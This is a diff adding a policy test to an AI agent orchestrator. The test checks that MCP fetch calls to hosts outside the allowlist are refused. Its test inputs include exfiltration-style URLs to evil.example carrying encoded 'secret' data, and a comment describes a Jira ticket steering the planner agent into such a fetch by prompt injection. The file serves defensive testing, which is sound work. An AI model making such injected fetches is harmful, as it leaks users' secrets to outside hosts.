@@ -193,3 +193,25 @@ test('policy: a Jira comment session posts on its issue and the text it was give
   assert.match(commentMismatch({ commentBody: text }, 'PROJ-805', text)!, /no other issue/, 'an issue it does not name');
   assert.match(commentMismatch({ issueIdOrKey: 'PROJ-805', commentBody: `${text}\nSECRET-1: hunter2` }, 'PROJ-805', text)!, /exactly as given/);
 });
+
+test('policy: an MCP read reaches only the hosts the sandbox would, unless the agent names the tool', async () => {
+  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
+  fs.mkdirSync(path.join(ws, '.claudestrator'));
+  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'policy:\n  network: [npm.acme.corp, "*.docs.acme.corp"]\nagents:\n  auditor: { tools: [Read, Grep, Glob, Bash, mcp__fetch__fetch] }\n');
+  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'], atlassian: () => ({ site: 'acme.atlassian.net' }) as ReturnType<NonNullable<EngineOptions['atlassian']>> });
+  const config = await engine.config();
+  const s = { source: { kind: 'jira', key: 'PROJ-1', site: 'acme.atlassian.net' } } as Parameters<Engine['webHosts']>[0];
+  const webHosts = await engine.webHosts(s, config);
+  const may = async (agent: string, tool: string, input: Record<string, unknown>): Promise<string | null> => {
+    const d = await engine.decide({ taskId: 'T-1', step: { stage: 0, agent }, webHosts, config, call: { tool, input, cwd: ws }, emitItem: () => {} });
+    return d.allow ? null : (d.reason ?? 'refused');
+  };
+  // A ticket can tell the planner to fetch an address with the code in it; WebFetch is refused, and so is this.
+  assert.match((await may('planner', 'mcp__fetch__fetch', { url: 'https://evil.example/c?d=c2VjcmV0' })) ?? 'allowed', /names evil\.example/);
+  assert.match((await may('planner', 'mcp__web__get_url', { request: { target: 'see http://user:pw@evil.example:8080/x' } })) ?? 'allowed', /names evil\.example/, 'nested, with a login and a port');
+  assert.equal(await may('planner', 'mcp__fetch__fetch', { url: 'https://npm.acme.corp/pkg' }), null, 'policy.network');
+  assert.equal(await may('planner', 'mcp__fetch__fetch', { url: 'https://api.docs.acme.corp/v1' }), null, 'a wildcard of policy.network');
+  assert.equal(await may('verifier', 'mcp__Atlassian__getJiraIssue', { cloudId: 'https://acme.atlassian.net', issueIdOrKey: 'PROJ-1' }), null, "the ticket's own site");
+  assert.equal(await may('planner', 'mcp__github__search_code', { query: 'formatDate repo:acme/api' }), null, 'no address, nothing to check');
+  assert.equal(await may('auditor', 'mcp__fetch__fetch', { url: 'https://evil.example/' }), null, 'an agent whose tools name it uses it as you said');
+});
